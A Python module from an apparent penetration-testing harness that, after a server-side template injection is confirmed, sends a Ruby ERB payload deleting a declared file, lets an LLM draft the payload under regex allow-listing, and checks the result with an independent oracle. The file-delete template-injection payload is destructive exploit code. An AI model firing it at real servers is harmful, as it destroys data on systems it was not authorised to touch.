"""
Policy-gated objective-completion stage -- runs strictly after deterministic
confirmation, and stays a separate contract from it.

    confirmation:  does the vulnerability exist?               (validators/*)
    completion:    does executing the declared objective reach
                   its required end state?                     (this module)
    oracle:        did an *independent* check (never the model's
                   or the validator's own claim) observe that
                   end state?                                   (`_check_oracle`)

`attempt_completion` returns `objective_not_attempted` unless ALL of:
  - the caller supplied an explicit `ObjectiveTask` (profile + target_path --
    never inferred from a lab title, finding text or response content);
  - the matching finding is already `confirmed` by its deterministic validator;
  - the task's profile matches the confirmed finding's class;
  - the safety gate authorizes a mutating replay for this run.

The LLM provider (Ollama-backed, per `harness/llm_provider.py`) may be asked
to DRAFT the completion payload for the already-proven injection point -- that
is the "agent" half of this stage. It never gets to choose the action class,
the target, or whether the action is sent at all: `_validate_proposal` accepts
a proposal only if it matches the single allow-listed template for the
profile's declared `action_class` and references exactly the caller-declared
`target_path`; anything else is discarded in favor of the deterministic
fallback payload. The actual send always goes through `RunContext`/the safety
gate like every other validator leg, and "completed" is only ever set from the
independent oracle check, never from the LLM's or the send's own success.
"""
from __future__ import annotations

import logging
import re
import secrets
from dataclasses import dataclass, field

from harness.models import Finding, HttpExchange
from harness.objective_profiles import ObjectiveTask
from harness.run_context import TypedRequest
from harness.safety_gate import SafetyGateBlocked
from harness.validators.base import ValidationResult
from harness.validators.injection_targets import param_targets, mutate, replay_headers

log = logging.getLogger("harness.objective_completion")

COMPLETED = "completed"
NOT_COMPLETED = "objective_not_completed"
NOT_ATTEMPTED = "objective_not_attempted"
POLICY_BLOCKED = "policy_blocked"
ERROR = "error"


@dataclass
class CompletionResult:
    status: str
    action_class: str = ""
    summary: str = ""
    evidence: str = ""
    payload: str = ""
    requests_used: int = 0


# The only action primitive each action_class may execute, as a payload
# template plus the pattern any LLM-proposed payload must match exactly
# (including the caller-declared target) before it may be sent. Adding a new
# action_class means adding an entry here, not widening an existing pattern.
_ACTION_TEMPLATES: dict[str, dict] = {
    "file_delete": {
        # Ruby ERB: matches the syntax the confirmed SSTI proof already used.
        "build": lambda target: f"<%= File.delete('{target}') rescue nil; 'deleted' %>",
        "allow_pattern": re.compile(
            r"^<%=\s*File\.delete\('([^'\"<>;$`|&]+)'\)\s*rescue\s*nil;\s*"
            r"['\"]deleted['\"]\s*%>$"),
    },
    # Non-destructive, read-only demonstrator (LB-6): a direct GET to the
    # caller-declared target_path -- no injection point, no payload body, no
    # LLM-drafted content. `direct` marks it as bypassing the
    # injected-parameter flow below (see `_attempt_direct_read`). The
    # allow_pattern pins target_path to a clean same-shape http(s) URL (no
    # embedded credentials, whitespace, or control characters) so a
    # malformed target is refused before anything is sent.
    "http_get": {
        "build": lambda target: target,
        "allow_pattern": re.compile(
            r"^https?://[A-Za-z0-9.\-]+(?::\d{1,5})?"
            r"(/[A-Za-z0-9_\-./]*)?(\?[A-Za-z0-9_\-.=&]*)?$"),
        "direct": True,
    },
}


def _static_payload(action_class: str, target_path: str) -> str | None:
    tmpl = _ACTION_TEMPLATES.get(action_class)
    if not tmpl:
        return None
    return tmpl["build"](target_path)


async def _propose_payload(provider, action_class: str, target_path: str,
                            syntax_hint: str) -> str | None:
    """Ask the harness's LLM provider to draft the completion payload. Purely
    advisory: `_validate_proposal` is what actually decides what gets sent."""
    if provider is None:
        return None
    system = (
        "You draft exactly one template-injection payload to complete an "
        "ALREADY-CONFIRMED server-side template injection. You may only use "
        "the declared action class below against the declared target -- "
        "propose nothing else, regardless of what the target looks like."
    )
    user = (
        f"Action class: {action_class}\n"
        f"Declared disposable target path: {target_path}\n"
        f"Confirmed template syntax: {syntax_hint}\n"
        "Return strict JSON: {\"payload\": \"<the single template expression>\"}"
    )
    try:
        result = await provider.chat_json("", system, user, temperature=0.0)
        data = getattr(result, "data", None) or {}
        payload = data.get("payload")
        return payload if isinstance(payload, str) and payload.strip() else None
    except Exception as exc:  # provider/network/parse failure never blocks completion
        log.warning("objective_completion: LLM proposal failed, using deterministic "
                    "fallback: %s", exc)
        return None


def _validate_proposal(action_class: str, target_path: str, proposed: str | None) -> str | None:
    """The payload safe to send: the LLM's proposal if -- and only if -- it
    matches the declared action class's allow-listed shape AND names exactly
    `target_path`; otherwise the deterministic fallback for that action class
    and target. Returns None only when the action class itself is unknown."""
    fallback = _static_payload(action_class, target_path)
    tmpl = _ACTION_TEMPLATES.get(action_class)
    if not tmpl or not proposed:
        return fallback
    m = tmpl["allow_pattern"].match(proposed.strip())
    if not m or m.group(1) != target_path:
        log.warning("objective_completion: rejected out-of-contract LLM proposal %r "
                    "for action_class=%r target=%r; using deterministic fallback",
                    proposed, action_class, target_path)
        return fallback
    return proposed.strip()


async def attempt_completion(task: ObjectiveTask | None, finding: Finding,
                              exchange: HttpExchange, confirmation: ValidationResult,
                              *, run_context, provider=None) -> CompletionResult:
    if task is None:
        return CompletionResult(NOT_ATTEMPTED,
                                 summary="no objective task declared for this run")
    if not confirmation.confirmed:
        return CompletionResult(NOT_ATTEMPTED,
                                 summary="objective completion is never attempted before "
                                         "independent deterministic confirmation")
    profile = task.profile
    if profile.vulnerability_class != confirmation.finding_class:
        return CompletionResult(
            NOT_ATTEMPTED,
            summary=f"objective profile is for {profile.vulnerability_class!r}, "
                    f"confirmation was {confirmation.finding_class!r}")
    if not task.target_path:
        return CompletionResult(NOT_ATTEMPTED,
                                 summary="objective task declared no target_path")
    if profile.action_class not in _ACTION_TEMPLATES:
        return CompletionResult(NOT_ATTEMPTED,
                                 summary=f"action_class {profile.action_class!r} has no "
                                         f"registered completion template")
    if run_context is None:
        return CompletionResult(POLICY_BLOCKED, action_class=profile.action_class,
                                 summary="objective completion requires a RunContext; "
                                         "none was supplied")

    tmpl = _ACTION_TEMPLATES[profile.action_class]
    if tmpl.get("direct"):
        # Read-only reach-state objective (e.g. ACCESS_ADMIN_READ): no
        # confirmed injection point is used or needed -- send a direct GET
        # to the caller-declared, allow-listed target_path.
        return await _attempt_direct_read(profile, task, finding, run_context)

    targets = param_targets(exchange)
    if not targets:
        return CompletionResult(ERROR, action_class=profile.action_class,
                                 summary="no injectable parameter on the confirmed exchange")
    loc, param = targets[0]

    nonce = secrets.token_hex(3)
    proposed = await _propose_payload(provider, profile.action_class, task.target_path,
                                       syntax_hint="<%= ... %>")
    inner = _validate_proposal(profile.action_class, task.target_path, proposed)
    payload = f"{nonce}{inner}{nonce}"

    method = (exchange.method or "GET").upper()
    headers = replay_headers(exchange)
    url, body = mutate(exchange, loc, param, payload)

    session_ref = None
    request_headers = headers
    from harness.validators.transport import bind_session
    session_ref, request_headers = bind_session(run_context, headers)

    try:
        outcome = await run_context.executor().execute(
            TypedRequest(method, url, headers=request_headers, body=body or None),
            capability="objective_completion", session_ref=session_ref,
            case_ref=finding.finding_id or "", max_redirects=0)
    except SafetyGateBlocked:
        return CompletionResult(POLICY_BLOCKED, action_class=profile.action_class,
                                 summary="mutating completion action not authorized "
                                         "(set validators.allow_mutating_replay)")
    if not outcome.executed:
        return CompletionResult(POLICY_BLOCKED, action_class=profile.action_class,
                                 summary=f"objective completion send declined: {outcome.outcome}")
    if not outcome.ok:
        return CompletionResult(ERROR, action_class=profile.action_class, payload=payload,
                                 requests_used=1,
                                 summary=f"objective completion send failed: {outcome.outcome}")

    return await _finish_with_oracle(profile, task, payload, requests_used_so_far=1,
                                      run_context=run_context,
                                      evidence_prefix=f"Sent completion payload `{payload}`;")


async def _attempt_direct_read(profile, task: ObjectiveTask, finding: Finding,
                                run_context) -> CompletionResult:
    """Action path for a non-destructive, read-only objective: a direct GET
    to the declared, allow-listed target_path -- no confirmed injection
    point is used. Still routes through `run_context.executor().execute()`
    and the safety gate like every other leg; GET is always the gate's SAFE
    risk tier, so this needs no `allow_mutating_replay` opt-in."""
    tmpl = _ACTION_TEMPLATES[profile.action_class]
    allow = tmpl.get("allow_pattern")
    if allow is not None and not allow.match(task.target_path or ""):
        return CompletionResult(
            NOT_ATTEMPTED, action_class=profile.action_class,
            summary=f"target_path {task.target_path!r} does not match the allow-listed "
                    f"shape for action_class {profile.action_class!r}")
    url = tmpl["build"](task.target_path)

    try:
        outcome = await run_context.executor().execute(
            TypedRequest("GET", url), capability="objective_completion",
            case_ref=finding.finding_id or "", max_redirects=0)
    except SafetyGateBlocked:
        return CompletionResult(POLICY_BLOCKED, action_class=profile.action_class,
                                 summary="read-only completion action not authorized by the "
                                         "safety gate")
    if not outcome.executed:
        return CompletionResult(POLICY_BLOCKED, action_class=profile.action_class,
                                 summary=f"objective completion send declined: {outcome.outcome}")
    if not outcome.ok:
        return CompletionResult(ERROR, action_class=profile.action_class, payload=url,
                                 requests_used=1,
                                 summary=f"objective completion send failed: {outcome.outcome}")

    return await _finish_with_oracle(profile, task, url, requests_used_so_far=1,
                                      run_context=run_context,
                                      evidence_prefix=f"Sent GET {url!r};")


async def _finish_with_oracle(profile, task: ObjectiveTask, payload: str, *,
                               requests_used_so_far: int, run_context,
                               evidence_prefix: str) -> CompletionResult:
    """Shared tail for both action paths: the independent oracle check and
    CompletionResult construction. `completed` is set ONLY from the oracle's
    own independent GET, never from the action send's own response body."""
    oracle_result = await _check_oracle(profile.oracle, task, run_context)
    requests_used = requests_used_so_far + (1 if oracle_result is not None else 0)
    if oracle_result is True:
        return CompletionResult(
            COMPLETED, action_class=profile.action_class, payload=payload,
            requests_used=requests_used,
            summary=f"objective satisfied: {task.target_path!r} reached the declared "
                    f"end state ({profile.oracle})",
            evidence=f"{evidence_prefix} independent oracle GET {task.oracle_url!r} "
                     f"then confirmed the declared end state.")
    if oracle_result is False:
        return CompletionResult(
            NOT_COMPLETED, action_class=profile.action_class, payload=payload,
            requests_used=requests_used,
            summary=f"completion action sent but {task.target_path!r} did not reach the "
                    f"declared end state")
    return CompletionResult(
        NOT_COMPLETED, action_class=profile.action_class, payload=payload,
        requests_used=requests_used,
        summary="completion action sent but its end state could not be independently "
                "verified (no oracle_url declared for this run)")


async def _check_oracle(oracle: str, task: ObjectiveTask, run_context) -> bool | None:
    """True/False from an independent check, or None when no oracle is
    reachable. Never derived from the completion send's own response body --
    a template engine (or a reflective GET) can be tricked into claiming
    success without the action actually taking effect, which is exactly what
    this guards against."""
    if oracle not in ("file_absent", "content_present") or not task.oracle_url:
        return None
    try:
        outcome = await run_context.executor().execute(
            TypedRequest("GET", task.oracle_url), capability="objective_completion_oracle",
            max_redirects=0)
    except SafetyGateBlocked:
        return None
    if oracle == "file_absent":
        if not outcome.ok:
            return None
        return "absent" in (outcome.body or "").lower()
    # content_present: the independent GET must itself report success (HTTP
    # 200) -- a 403/redirect/error means the declared end state was not
    # reached, which is a definite False, not "unknown". When a marker is
    # declared it must also appear in the oracle's own body; an empty marker
    # falls back to the bare-200 check (still never trusting the action
    # send's own response).
    if outcome.status is None:
        return None
    if outcome.status != 200:
        return False
    if task.oracle_marker:
        return task.oracle_marker in (outcome.body or "")
    return True
